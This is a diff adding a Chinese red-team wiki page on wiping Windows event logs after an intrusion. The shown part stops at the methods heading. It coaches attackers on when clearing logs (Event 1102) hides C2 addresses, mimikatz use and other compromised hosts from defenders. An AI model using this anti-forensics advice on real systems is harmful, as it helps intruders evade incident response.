@@ -1,0 +1,325 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta charset="UTF-8"><meta name="viewport" content="user-scalable=yes, width=device-width, initial-scale=1, maximum-scale=5"><meta name="theme-color" content="#1976d2"><meta name="msapplication-TileColor" content="#1976d2"><meta name="msapplication-TileImage" content="/_assets/favicons/mstile-150x150.png"><title>痕迹的抹除 - 清理现场 | Redteam Wiki</title><meta name="description" content=""><meta property="og:title" content="痕迹的抹除 - 清理现场"><meta property="og:type" content="website"><meta property="og:description" content=""><meta property="og:image"><meta property="og:url" content="https://redteam-wiki.org/en/log-clearing"><meta property="og:site_name" content="Redteam Wiki"><link rel="apple-touch-icon" sizes="180x180" href="/_assets/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="192x192" href="/_assets/favicons/android-chrome-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/_assets/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/_assets/favicons/favicon-16x16.png"><link rel="mask-icon" href="/_assets/favicons/safari-pinned-tab.svg" color="#1976d2"><link rel="manifest" href="/_assets/manifest.json"><script>var siteConfig = {"title":"Redteam Wiki","theme":"default","darkMode":false,"tocPosition":"left","lang":"en","rtl":false,"company":"Redteam Wiki","contentLicense":"","footerOverride":"","logoUrl":"https://static.requarks.io/logo/wikijs-butterfly.svg"}
+var siteLangs = []
+</script><link type="text/css" rel="stylesheet" href="/_assets/css/app.2144b7acef37b4a5cc2e.css"><script type="text/javascript" src="/_assets/js/runtime.js?1755069093"></script><script type="text/javascript" src="/_assets/js/app.js?1755069093"></script></head><body><div id="root"><page locale="en" path="log-clearing" title="痕迹的抹除 - 清理现场" description="" :tags="[]" created-at="2025-11-27T16:37:41.655Z" updated-at="2025-11-27T16:37:45.135Z" author-name="芙蕾德莉卡" :author-id="1" editor="markdown" :is-published="true" toc="W3sidGl0bGUiOiIxLiDlvJXoqIDvvJrkvaDnlZnkuIvnmoRcIuaMh+e6uVwiIiwiYW5jaG9yIjoiI2gtMS3lvJXoqIDkvaDnlZnkuIvnmoTmjIfnurkiLCJjaGlsZHJlbiI6W119LHsidGl0bGUiOiIyLiDnl5Xov7nmuIXnkIbnmoTmoLjlv4PorqTnn6UiLCJhbmNob3IiOiIjaC0yLeeXlei/uea4heeQhueahOaguOW/g+iupOefpSIsImNoaWxkcmVuIjpbeyJ0aXRsZSI6IueXlei/uea4heeQhuacrOi6q+S5n+S8muS6p+eUn+eXlei/uSIsImFuY2hvciI6IiPnl5Xov7nmuIXnkIbmnKzouqvkuZ/kvJrkuqfnlJ/nl5Xov7kiLCJjaGlsZHJlbiI6W119XX0seyJ0aXRsZSI6IjMuIOaXpeW/l+a4heeQhu+8mueci+WvueaJi+S4i+iPnOeinyIsImFuY2hvciI6IiNoLTMt5pel5b+X5riF55CG55yL5a+55omL5LiL6I+c56KfIiwiY2hpbGRyZW4iOlt7InRpdGxlIjoi8J+OryDlr7nmiYvmsLTlubPlhrPlrprmuIXnkIbnrZbnlaUiLCJhbmNob3IiOiIj5a+55omL5rC05bmz5Yaz5a6a5riF55CG562W55WlIiwiY2hpbGRyZW4iOlt7InRpdGxlIjoi5Zy65pmv5LiA77ya6YGH5Yiw6auY5omL77yI5LiT5Lia5a6J5YWo5Zui6Zif77yJIiwiYW5jaG9yIjoiI+WcuuaZr+S4gOmBh+WIsOmrmOaJi+S4k+S4muWuieWFqOWboumYnyIsImNoaWxkcmVuIjpbXX0seyJ0aXRsZSI6IuWcuuaZr+S6jO+8mumBh+WIsOaWsOaJi++8iOaZrumAmui/kOe7tO+8iSIsImFuY2hvciI6IiPlnLrmma/kuozpgYfliLDmlrDmiYvmma7pgJrov5Dnu7QiLCJjaGlsZHJlbiI6W119XX0seyJ0aXRsZSI6IvCfk4og5riF55CG5Yaz562W6KGoIiwiYW5jaG9yIjoiI+a4heeQhuWGs+etluihqCIsImNoaWxkcmVuIjpbXX1dfSx7InRpdGxlIjoiNC4gV2luZG93cyDml6Xlv5fmuIXnkIbmlrnms5UiLCJhbmNob3IiOiIjaC00LXdpbmRvd3Mt5pel5b+X5riF55CG5pa55rOVIiwiY2hpbGRyZW4iOlt7InRpdGxlIjoi5pa55rOV5LiA77ya5YWo6YOo5riF56m6IiwiYW5jaG9yIjoiI+aWueazleS4gOWFqOmDqOa4heepuiIsImNoaWxkcmVuIjpbXX0seyJ0aXRsZSI6IuaWueazleS6jO+8muWumuWQkeWIoOmZpCIsImFuY2hvciI6IiPmlrnms5XkuozlrprlkJHliKDpmaQiLCJjaGlsZHJlbiI6W119LHsidGl0bGUiOiLmlrnms5XkuInvvJrkuI3muIXnkIbvvIzkvYblvLrosIPmnKzouqvnmoTpmpDolL3mgKciLCJhbmNob3IiOiIj5pa55rOV5LiJ5LiN5riF55CG5L2G5by66LCD5pys6Lqr55qE6ZqQ6JS95oCnIiwiY2hpbGRyZW4iOltdfV19LHsidGl0bGUiOiI1LiDlhbbku5blhbPplK7nl5Xov7nmuIXnkIYiLCJhbmNob3IiOiIjaC01LeWFtuS7luWFs+mUrueXlei/uea4heeQhiIsImNoaWxkcmVuIjpbeyJ0aXRsZSI6IuKchSDmuIXnkIbmlofku7bnl5Xov7kiLCJhbmNob3IiOiIj5riF55CG5paH5Lu255eV6L+5IiwiY2hpbGRyZW4iOltdfSx7InRpdGxlIjoi4pyFIOa4heeQhuazqOWGjOihqOeXlei/uSIsImFuY2hvciI6IiPmuIXnkIbms6jlhozooajnl5Xov7kiLCJjaGlsZHJlbiI6W119LHsidGl0bGUiOiLinIUg5riF55CGIFJEUCDnl5Xov7kiLCJhbmNob3IiOiIj5riF55CGLXJkcC3nl5Xov7kiLCJjaGlsZHJlbiI6W119LHsidGl0bGUiOiLinIUg5riF55CG572R57uc55eV6L+5IiwiYW5jaG9yIjoiI+a4heeQhue9kee7nOeXlei/uSIsImNoaWxkcmVuIjpbXX1dfSx7InRpdGxlIjoiNi4g5a+55oqXIFN5c21vbiIsImFuY2hvciI6IiNoLTYt5a+55oqXLXN5c21vbiIsImNoaWxkcmVuIjpbeyJ0aXRsZSI6IuS7gOS5iOaYryBTeXNtb27vvJ8iLCJhbmNob3IiOiIj5LuA5LmI5pivLXN5c21vbiIsImNoaWxkcmVuIjpbXX0seyJ0aXRsZSI6IvCflI0g5qOA5rWLIFN5c21vbiIsImFuY2hvciI6IiPmo4DmtYstc3lzbW9uIiwiY2hpbGRyZW4iOltdfSx7InRpdGxlIjoi8J+boe+4jyDlr7nmipfnrZbnlaUiLCJhbmNob3IiOiIj77iPLeWvueaKl+etlueVpSIsImNoaWxkcmVuIjpbeyJ0aXRsZSI6IuetlueVpeS4gO+8muWNuOi9ve+8iOeugOWNleS9huaYjuaYvu+8iSIsImFuY2hvciI6IiPnrZbnlaXkuIDljbjovb3nroDljZXkvYbmmI7mmL4iLCJjaGlsZHJlbiI6W119LHsidGl0bGUiOiLnrZbnlaXkuozvvJrpgb/lvIDop4TliJnvvIjmm7TogarmmI7vvIkiLCJhbmNob3IiOiIj562W55Wl5LqM6YG/5byA6KeE5YiZ5pu06IGq5piOIiwiY2hpbGRyZW4iOltdfV19XX0seyJ0aXRsZSI6IjcuIOaXoOaWh+S7tuaUu+WHu++8muacgOWlveeahOa4heeQhuaYr+S4jeeVmeeXlei/uSIsImFuY2hvciI6IiNoLTct5peg5paH5Lu25pS75Ye75pyA5aW955qE5riF55CG5piv5LiN55WZ55eV6L+5IiwiY2hpbGRyZW4iOlt7InRpdGxlIjoi8J+lhyDlooPnlYzvvJrmoLnmnKzkuI3kuqfnlJ/nl5Xov7kiLCJhbmNob3IiOiIj5aKD55WM5qC55pys5LiN5Lqn55Sf55eV6L+5IiwiY2hpbGRyZW4iOltdfSx7InRpdGxlIjoi8J+OrSDkvKroo4XmiJDns7vnu5/ov5vnqIsiLCJhbmNob3IiOiIj5Lyq6KOF5oiQ57O757uf6L+b56iLIiwiY2hpbGRyZW4iOltdfV19LHsidGl0bGUiOiI4LiDmuIXnkIbnmoTkuInkuKrljp/liJkiLCJhbmNob3IiOiIjaC04Lea4heeQhueahOS4ieS4quWOn+WImSIsImNoaWxkcmVuIjpbeyJ0aXRsZSI6IvCfjq8g5qC45b+D5Y6f5YiZIiwiYW5jaG9yIjoiI+aguOW/g+WOn+WImSIsImNoaWxkcmVuIjpbXX0seyJ0aXRsZSI6IvCfkqEg5Z+65pys5oCd6LevIiwiYW5jaG9yIjoiI+WfuuacrOaAnei3ryIsImNoaWxkcmVuIjpbXX0seyJ0aXRsZSI6IvCfjqwg55yf5a6e5qGI5L6L5a+55q+UIiwiYW5jaG9yIjoiI+ecn+WunuahiOS+i+WvueavlCIsImNoaWxkcmVuIjpbXX1dfSx7InRpdGxlIjoiOS4g5oC757uT77ya5riF55CG55qE5Yaz562W5qCRIiwiYW5jaG9yIjoiI2gtOS3mgLvnu5PmuIXnkIbnmoTlhrPnrZbmoJEiLCJjaGlsZHJlbiI6W119XQ==" :page-id="25" sidebar="W3siaSI6InNkaS0xIiwiayI6ImxpbmsiLCJsIjoiSG9tZSIsImMiOiJtZGktaG9tZSIsInkiOiJob21lIiwidCI6Ii8ifSx7ImkiOiJzZGktMiIsImsiOiJkaXZpZGVyIiwibCI6bnVsbCwiYyI6bnVsbCwieSI6bnVsbCwidCI6bnVsbH0seyJpIjoic2RpLTMiLCJrIjoibGluayIsImwiOiLph43opoHpobvnn6UiLCJjIjoibWRpLWNoZXZyb24tcmlnaHQiLCJ5IjoicGFnZSIsInQiOiIvZW4vbm90aWZ5In0seyJpIjoic2RpLTQiLCJrIjoibGluayIsImwiOiLpgJ/mn6Xor43lhbgiLCJjIjoibWRpLWNoZXZyb24tcmlnaHQiLCJ5IjoicGFnZSIsInQiOiIvZW4vZGljdGlvbmFyeSJ9LHsiaSI6InNkaS01IiwiayI6ImxpbmsiLCJsIjoi5bel5YW35YeG5aSHIiwiYyI6Im1kaS1jaGV2cm9uLXJpZ2h0IiwieSI6InBhZ2UiLCJ0IjoiL2VuL3Rvb2xzLWxpc3QifSx7ImkiOiJzZGktNiIsImsiOiJsaW5rIiwibCI6IuW/q+mAn+W8gOWniyIsImMiOiJtZGktY2hldnJvbi1yaWdodCIsInkiOiJwYWdlIiwidCI6Ii9lbi9xdWlja3N0YXJ0In0seyJpIjoic2RpLTciLCJrIjoibGluayIsImwiOiLkv6Hmga/mlLbpm4bvvIzkuobop6PkvaDnmoTnm67moIciLCJjIjoibWRpLWNoZXZyb24tcmlnaHQiLCJ5IjoicGFnZSIsInQiOiIvZW4vaW5mby1jb2xsZWN0In0seyJpIjoic2RpLTgiLCJrIjoibGluayIsImwiOiLotYTkuqfmtYvnu5ggLSDnn6XpgZPkvaDlnKjov5vmlLvku4DkuYgiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vZmluZGluZy1hc3NldHMifSx7ImkiOiJzZGktOSIsImsiOiJsaW5rIiwibCI6IuS6uuWRmOa1i+e7mCAtIOS9oOWFu+mxvOeahOaxoOWhmCIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9wZW9wbGUtY29sbGVjdCJ9LHsiaSI6InNkaS0xMCIsImsiOiJsaW5rIiwibCI6IuacqOmprO+8jOS4gOWIh+ihjOWKqOeahOWfuuefsyIsImMiOiJtZGktY2hldnJvbi1yaWdodCIsInkiOiJwYWdlIiwidCI6Ii9lbi90cm9qYW4tc3RhcnRlciJ9LHsiaSI6InNkaS0xMSIsImsiOiJsaW5rIiwibCI6InNoZWxsY29kZSAtIOacqOmprOeahOW/g+iEjyIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9zaGVsbGNvZGUtc3RhcnRlciJ9LHsiaSI6InNkaS0xMiIsImsiOiJsaW5rIiwibCI6IuS9oOeahOesrOS4gOasoei/nOeoi+aOp+WItiAtIENvYmFsdFN0cmlrZTEwMSIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9jcy0xMDEifSx7ImkiOiJzZGktMTMiLCJrIjoibGluayIsImwiOiLpnZnmgIHlr7nmipcgLSDku47nibnlvoHnoIHliLDogZrnsbvnibnlvoEiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vc3RhdGljLWFuYWx5emUifSx7ImkiOiJzZGktMTQiLCJrIjoibGluayIsImwiOiLliqjmgIHlr7nmipcgLSDooYzkuLrliIbmnpDkvZXku6Xlj6/og70iLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vZHluYW1pYy1jb21wZXRpdGlvbiJ9LHsiaSI6InNkaS0xNSIsImsiOiJsaW5rIiwibCI6IuiHtOebsuS4juWkseiDvSAtIOeYq+eXquWuiOWNq+iAhSIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9ibGluZGluZy1lZHIifSx7ImkiOiJzZGktMTYiLCJrIjoibGluayIsImwiOiLlr7nmipfomZrmi5/ljJYgLSDnibnmropcIuWbveaDhVwi5LiL55qE57uV6L+HIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6InBhZ2UiLCJ0IjoiL2VuL2FudGktdm0tY24tc3BlY2lmaWMifSx7ImkiOiJzZGktMTciLCJrIjoibGluayIsImwiOiLmlq3lvIDov5vnqIvpk74gLSDorqlTaGF0dGVyIEF0dGFja+WGjeasoeS8n+WkpyIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9icmVhay1jaGFpbiJ9LHsiaSI6InNkaS0xOCIsImsiOiJsaW5rIiwibCI6IueJqeeQhuivu+WGmeWIqeeUqOe7lei/h+aKgOacryAtIG1tcGZu6K+m6KejIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6InBhZ2UiLCJ0IjoiL2VuL3BoeXNpY2FsLW1lbW9yeS1ydy1tbXBmbiJ9LHsiaSI6InNkaS0xOSIsImsiOiJsaW5rIiwibCI6IueXlei/ueeahOaKuemZpCAtIOa4heeQhueOsOWcuiIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9sb2ctY2xlYXJpbmcifSx7ImkiOiJzZGktMjAiLCJrIjoibGluayIsImwiOiLpkpPpsbzvvIzkvaDnmoTnrKzkuIDlj7DmiJjliKnlk4EiLCJjIjoibWRpLWNoZXZyb24tcmlnaHQiLCJ5IjoicGFnZSIsInQiOiIvZW4vcGhpc2hpbmctdHV0b3JpYWwifSx7ImkiOiJzZGktMjEiLCJrIjoibGluayIsImwiOiLmsqHkurrmmK/ooKLotKfvvJrpkpPpsbzovb3ojbfnmoTpgInmi6kiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vY2hvb3NlLWZpbGUifSx7ImkiOiJzZGktMjIiLCJrIjoibGluayIsImwiOiLpkpPpsbzlr7zorrrvvJrkv6Hku7vnmoTlu7rnq4vlkozor7Hlr7wiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vcGhpc2hpbmctc3RhcnRlciJ9LHsiaSI6InNkaS0yMyIsImsiOiJsaW5rIiwibCI6IklN5pS76Ziy77ya5ouT5bGV5pS75Ye76Z2i5ZKM5oOz6LGh5YqbIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6InBhZ2UiLCJ0IjoiL2VuL0lNLXZ1bG4ifSx7ImkiOiJzZGktMjQiLCJrIjoibGluayIsImwiOiLlgqjlpIfmtojogJfmiJggOiDkvaDnmoTlhbvlj7fnrZbnlaUiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vaW0tYWNjb3VudC13YXJtaW5nLXN0cmF0ZWd5In0seyJpIjoic2RpLTI1IiwiayI6ImxpbmsiLCJsIjoi5Lqr55So5ZKM57u05oyB5L2g55qE5oiY5Yip5ZOBIiwiYyI6Im1kaS1jaGV2cm9uLXJpZ2h0IiwieSI6InBhZ2UiLCJ0IjoiL2VuL3BlcnNpc3RlbmNlLWFuZC1jcmVkZW50aWFsLWhhcnZlc3RpbmcifSx7ImkiOiJzZGktMjYiLCJrIjoibGluayIsImwiOiJCeXBhc3NVQUMgLSDmi7/lm57ljp/mnKznmoTmnYPpmZAiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vdWFjLWJ5cGFzcyJ9LHsiaSI6InNkaS0yNyIsImsiOiJsaW5rIiwibCI6Iuadg+mZkOaPkOWNhyAtIOS7juWwj+WFteWIsOWls+eOiyIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9wcml2aWxlZ2UtZXNjYWxhdGlvbiJ9LHsiaSI6InNkaS0yOCIsImsiOiJsaW5rIiwibCI6IuaMgeS5heWMliAtIOeos+WbuuS9oOeahOaImOWIqeWTgSIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9wZXJzaXN0ZW5jZSJ9LHsiaSI6InNkaS0yOSIsImsiOiJsaW5rIiwibCI6IuWHreivgeiOt+WPliAtIOS9oOaJi+S4reeahOmSpeWMmSIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9jcmVkZW50aWFsLWhhcnZlc3RpbmctdGhlLWtleXMtaW4teW91ci1oYW5kIn0seyJpIjoic2RpLTMwIiwiayI6ImxpbmsiLCJsIjoi5ZG95Luk5LiO5o6n5Yi2IiwiYyI6Im1kaS1jaGV2cm9uLXJpZ2h0IiwieSI6InBhZ2UiLCJ0IjoiL2VuL2MyLWluZnJhc3RydWN0dXJlLXN0ZWFsdGgifSx7ImkiOiJzZGktMzEiLCJrIjoibGluayIsImwiOiJDMui9veiNt+S4jumAmuS/oeaKgOacryIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9jMi1wYXlsb2FkLWFuZC1zdGVhbHRoLWNvbW1zIn0seyJpIjoic2RpLTMyIiwiayI6ImxpbmsiLCJsIjoi6Zqn6YGT5LiO56m/6YCP5oqA5pyvIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6ImhvbWUiLCJ0IjoiIn0seyJpIjoic2RpLTMzIiwiayI6ImxpbmsiLCJsIjoiV2Vi5riX6YCP77yM5LuO5q2j6Z2i5Yib6YCg56qB56C05Y+jIiwiYyI6Im1kaS1jaGV2cm9uLXJpZ2h0IiwieSI6InBhZ2UiLCJ0IjoiL2VuL3dlYi1zdGFydGVyIn0seyJpIjoic2RpLTM0IiwiayI6ImxpbmsiLCJsIjoi5Lyg57uf5ryP5rSeIC0g5Y+k6ICB5L2G5pyJ5pWIIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6InBhZ2UiLCJ0IjoiL2VuL2Jhc2ljLXdlYi12dWxuIn0seyJpIjoic2RpLTM1IiwiayI6ImxpbmsiLCJsIjoi5Y+N5bqP5YiX5YyWIC0g546w5Luj6L+b5pS75oqA5pyvIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6InBhZ2UiLCJ0IjoiL2VuL2Rlc2VyaWFsaXplLWJhc2ljIn0seyJpIjoic2RpLTM2IiwiayI6ImxpbmsiLCJsIjoiTmRheeWIqeeUqCAtIOahhuaetu+8jOe7hOS7tu+8jOWSjOW6lOeUqCIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9iYXNpYy1uZGF5In0seyJpIjoic2RpLTM3IiwiayI6ImxpbmsiLCJsIjoiMGRheea8j+a0niAtIOWNsemZqeadpea6kOS6juacquefpSIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9iYXNpYy0wZGF5In0seyJpIjoic2RpLTM4IiwiayI6ImxpbmsiLCJsIjoi5L6b5bqU6ZO+5pS75Ye7IC0g5ZaE5pS76ICF5Yqo5LqO5Lmd5aSp5LmL5LiKIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6InBhZ2UiLCJ0IjoiL2VuL3N1cHBseS1jaGFpbi1hdHRhY2stYmFzaWMifSx7ImkiOiJzZGktMzkiLCJrIjoibGluayIsImwiOiLmqKrlkJHnp7vliqgg77yM5oiY5p6c55qE5oyH5pWw5omp5aKeIiwiYyI6Im1kaS1jaGV2cm9uLXJpZ2h0IiwieSI6InBhZ2UiLCJ0IjoiL2VuL2xhdGVyYWwtbW92ZW1lbnQifSx7ImkiOiJzZGktNDAiLCJrIjoibGluayIsImwiOiLmiavmj4/lkozlr4bnoIHllrfmtJIgLSDku47mlrDmiYvnlKjliLDpgIDlvbkiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vc2Nhbm5pbmcifSx7ImkiOiJzZGktNDEiLCJrIjoibGluayIsImwiOiJXaW5kb3dzIEFEIC0g5Z+f5pS76Ziy55qE6YKj5Lqb5LqLIiwiYyI6Im1kaS1maWxlLWRvY3VtZW50LW11bHRpcGxlIiwieSI6InBhZ2UiLCJ0IjoiL2VuL3dpbmRvd3MtYWQtc2VjdXJpdHkifSx7ImkiOiJzZGktNDIiLCJrIjoiaGVhZGVyIiwibCI6IuWgoeWekuacuuWSjOe9kee7nOiuvuWkhyIsImMiOm51bGwsInkiOm51bGwsInQiOm51bGx9LHsiaSI6InNkaS00MyIsImsiOiJoZWFkZXIiLCJsIjoi5LqR546v5aKD5riX6YCPIC0g5paw55qE6L6555WM5ZKM5oyR5oiYIiwiYyI6bnVsbCwieSI6bnVsbCwidCI6bnVsbH0seyJpIjoic2RpLTQ0IiwiayI6ImxpbmsiLCJsIjoi6ZmE5b2VIiwiYyI6Im1kaS1jaGV2cm9uLXJpZ2h0IiwieSI6ImhvbWUiLCJ0IjoiIn0seyJpIjoic2RpLTQ1IiwiayI6ImxpbmsiLCJsIjoiV2luZG93c+acrOWcsOaPkOadg+WOn+eQhuivpuinoyIsImMiOiJtZGktZmlsZS1kb2N1bWVudC1tdWx0aXBsZSIsInkiOiJwYWdlIiwidCI6Ii9lbi9scGUtZXhhbXBsZSJ9LHsiaSI6InNkaS00NiIsImsiOiJsaW5rIiwibCI6IueMtOWtkOaJk+WtlyAtIOa1heiwiHdpbmRvd3PlhoXmoLjmvI/mtJ7mjJbmjpgiLCJjIjoibWRpLWZpbGUtZG9jdW1lbnQtbXVsdGlwbGUiLCJ5IjoicGFnZSIsInQiOiIvZW4vd2luZG93cy1rZXJuZWwtdnVsbiJ9LHsiaSI6InNkaS00NyIsImsiOiJsaW5rIiwibCI6IuaPkOmXrueahOaZuuaFpyIsImMiOiJtZGktY2hldnJvbi1yaWdodCIsInkiOiJwYWdlIiwidCI6Ii9lbi9hc2stcXVlc3Rpb24ifV0=" nav-mode="STATIC" comments-enabled effective-permissions="eyJjb21tZW50cyI6eyJyZWFkIjp0cnVlLCJ3cml0ZSI6ZmFsc2UsIm1hbmFnZSI6ZmFsc2V9LCJoaXN0b3J5Ijp7InJlYWQiOmZhbHNlfSwic291cmNlIjp7InJlYWQiOmZhbHNlfSwicGFnZXMiOnsicmVhZCI6dHJ1ZSwid3JpdGUiOmZhbHNlLCJtYW5hZ2UiOmZhbHNlLCJkZWxldGUiOmZhbHNlLCJzY3JpcHQiOmZhbHNlLCJzdHlsZSI6ZmFsc2V9LCJzeXN0ZW0iOnsibWFuYWdlIjpmYWxzZX19" edit-shortcuts="eyJlZGl0RmFiIjp0cnVlLCJlZGl0TWVudUJhciI6ZmFsc2UsImVkaXRNZW51QnRuIjp0cnVlLCJlZGl0TWVudUV4dGVybmFsQnRuIjp0cnVlLCJlZGl0TWVudUV4dGVybmFsTmFtZSI6IkdpdEh1YiIsImVkaXRNZW51RXh0ZXJuYWxJY29uIjoibWRpLWdpdGh1YiIsImVkaXRNZW51RXh0ZXJuYWxVcmwiOiJodHRwczovL2dpdGh1Yi5jb20vb3JnL3JlcG8vYmxvYi9tYWluL3tmaWxlbmFtZX0ifQ==" filename="log-clearing.md"><template slot="contents"><div><h2 id="h-1-引言你留下的指纹" class="toc-header"><a class="toc-anchor" href="#h-1-引言你留下的指纹">¶</a> 1. 引言：你留下的"指纹"</h2>
+<p>上一章我们学会了如何致盲 EDR，让守卫者看不见我们的行动。但有个残酷的事实：</p>
+<p><strong>即使 EDR 被致盲，Windows 系统本身也像个话痨，把你做的每件事都记录下来。</strong></p>
+<p>想象这个场景：</p>
+<blockquote>
+<p>你的 Beacon 已经稳定运行 3 天，成功窃取了敏感数据。<br>
+第 4 天，连接突然断开。<br>
+为什么？因为蓝队在事件日志里看到了你的 PowerShell 命令，顺藤摸瓜找到了你的 C2 地址和木马特征。</p>
+</blockquote>
+<p>这一章，我们要学会：<strong>如何不在犯罪现场留下指纹。</strong></p>
+<hr>
+<h2 id="h-2-痕迹清理的核心认知" class="toc-header"><a class="toc-anchor" href="#h-2-痕迹清理的核心认知">¶</a> 2. 痕迹清理的核心认知</h2>
+<h3 id="痕迹清理本身也会产生痕迹" class="toc-header"><a class="toc-anchor" href="#痕迹清理本身也会产生痕迹">¶</a> 痕迹清理本身也会产生痕迹</h3>
+<p>这是最重要的认知：<strong>不存在完美的痕迹清理。</strong></p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">清理前的日志：
+10:23:45  执行了 mimikatz
+10:24:00  连接 C2: 103.x.x.x
+
+清理后的日志：
+10:25:00  Event 1102: 安全日志已被清除
+</code></pre>
+<p><strong>关键问题：你的对手是谁？</strong></p>
+<hr>
+<h2 id="h-3-日志清理看对手下菜碟" class="toc-header"><a class="toc-anchor" href="#h-3-日志清理看对手下菜碟">¶</a> 3. 日志清理：看对手下菜碟</h2>
+<h3 id="对手水平决定清理策略" class="toc-header"><a class="toc-anchor" href="#对手水平决定清理策略">¶</a> 🎯 对手水平决定清理策略</h3>
+<h4 id="场景一遇到高手专业安全团队" class="toc-header"><a class="toc-anchor" href="#场景一遇到高手专业安全团队">¶</a> 场景一：遇到高手（专业安全团队）</h4>
+<p><strong>情况：</strong> 人家已经发现异常，正在调查这台服务器</p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">如果不清日志：
+→ 蓝队分析日志，提取 IOC：
+  • payload.exe 的 MD5: a1b2c3...
+  • C2 地址: 103.x.x.x
+  • 使用了 CobaltStrike 4.5
+  • 命令行参数完整记录
+→ 拿着这些特征去全网搜索
+→ 找到你控制的其他 20 台机器
+
+如果清空日志：
+→ 蓝队只知道：
+  • 这台机器被入侵了（Event 1102）
+  • 但不知道你用了什么工具
+  • 不知道 C2 地址和端口
+  • 不知道文件特征
+→ 无法横向追踪其他失陷主机
+
+结论：清空日志切断证据链，保护其他据点
+</code></pre>
+<p><strong>为什么要清？</strong> 防止他们提取你的工具指纹、C2 地址、攻击手法，无法横向追踪。</p>
+<hr>
+<h4 id="场景二遇到新手普通运维" class="toc-header"><a class="toc-anchor" href="#场景二遇到新手普通运维">¶</a> 场景二：遇到新手（普通运维）</h4>
+<p><strong>情况：</strong> 系统有上百台服务器，运维不知道哪台有问题</p>
+<pre class="prismjs line-numbers" v-pre="true"><code class="language-">如果不清日志：
+→ 运维定期巡检，日志都很正常
+→ 你的恶意操作淹没在海量日志里
+→ 可以潜伏几个月
+
+如果清空日志：
+→ 运维："这台服务器日志怎么空了？Event 1102？"
+→ "赶紧上报！可能被入侵了！"
+→ 原本他根本不会检查这台机器
+→ 你反而暴露了目标
+
+结论：别清！Event 1102 就是此地无银三百两
+</code></pre>
+<p><strong>为什么不清？</strong> 对方根本不知道哪台机器有问题，你一清反而暴露了。</p>
+<hr>
+<h3 id="清理决策表" class="toc-header"><a class="toc-anchor" href="#清理决策表">¶</a> 📊 清理决策表</h3>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>对手水平</th>
+<th>他们的状态</th>
+<th>你该怎么做？</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>高手</strong></td>
+<td>已经锁定这台机器</td>
+<td><strong>清！</strong></td>
+<td>防止提取 IOC 横向追踪</td>
+</tr>
+<tr>
+<td><strong>新手</strong></td>
+<td>不知道哪台有问题</td>
+<td><strong>别清！</strong></td>
+<td>Event 1102 会暴露目标</td>
+</tr>
+<tr>
+<td><strong>中等</strong></td>
+<td>有告警但没深入查</td>
+<td><strong>看情况</strong></td>
+<td>如果要深入分析，就清</td>
+</tr>
+</tbody>
+</table></div>
+<hr>
+<h2 id="h-4-windows-日志清理方法" class="toc-header"><a class="toc-anchor" href="#h-4-windows-日志清理方法">¶</a> 4. Windows 日志清理方法</h2>
